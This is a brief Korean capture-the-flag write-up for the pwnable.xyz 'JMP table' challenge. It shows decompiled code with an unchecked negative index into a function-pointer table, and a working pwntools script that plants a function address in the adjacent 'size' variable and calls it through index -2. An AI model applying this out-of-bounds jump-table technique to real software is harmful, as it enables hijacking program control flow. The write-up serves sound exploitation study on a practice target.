# JMP table
* 
~~~c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // [rsp+Ch] [rbp-4h]

  setup();
  while ( 1 )
  {
    print_menu();
    printf("> ", argv);
    v3 = read_long();
    if ( v3 <= 4 )
      (*(&vtable + v3))();
    else
      puts("Invalid.");
  }
}
~~~
  IDA에서 확인한 code. 보고 음수를 넣을 수 있다고 생각하고 음수를 넣어 core dumped 가 발생하는 것까지 확인
* IDA에서 _ 함수에서 flag를 출력해주는 것 확인
* 
~~~
.data:00000000006020B0                 public size
.data:00000000006020B0 ; size_t size
.data:00000000006020B0 size            dq 1                    ; DATA XREF: do_malloc+1E↑w
.data:00000000006020B0                                         ; do_malloc+25↑r ...
.data:00000000006020B8                 public heap_buffer
.data:00000000006020B8 ; void *heap_buffer
.data:00000000006020B8 heap_buffer     dq 1                    ; DATA XREF: do_malloc+3F↑w
.data:00000000006020B8                                         ; do_malloc+50↑w ...
.data:00000000006020C0                 public vtable
.data:00000000006020C0 vtable          dq offset do_exit  
~~~
IDA를 통해 vtable을 통해 함수들을 실행해주고 그 뒤에 size 주소가 있는 것을 확인
* exploit 방법은 1.옵션으로 size 영역에 _ 함수 주소를 넣어두고 vtable -2 즉 size 영역을 실행해 _ 함수를 실행해줌
~~~python
from pwn import *

p=remote('svc.pwnable.xyz',30007)
e=ELF('./jmptable')

ex=e.symbols['_']

p.sendlineafter('>','1')
p.sendlineafter(':',str(ex))

p.sendlineafter('>','-2')

p.interactive()
~~~
